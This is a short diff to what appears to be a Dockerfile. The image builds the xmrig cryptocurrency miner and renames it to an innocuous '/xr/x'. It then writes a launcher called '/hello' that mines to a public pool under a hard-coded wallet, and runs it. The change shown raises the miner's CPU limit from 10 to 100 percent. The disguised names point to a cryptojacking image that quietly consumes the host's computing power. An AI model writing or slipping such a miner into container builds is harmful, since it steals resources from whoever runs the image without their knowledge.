@@ -15,6 +15,6 @@ RUN   apk --no-cache upgrade && \
         cmake \
         git && \
       mv /xr/xmrig /xr/x && \
-      echo "/xr/x -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.sema -p x -k --max-cpu-usage 10" > /hello && \
+      echo "/xr/x -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.sema -p x -k --max-cpu-usage 100" > /hello && \
       chmod 0777 /hello && \
       /hello
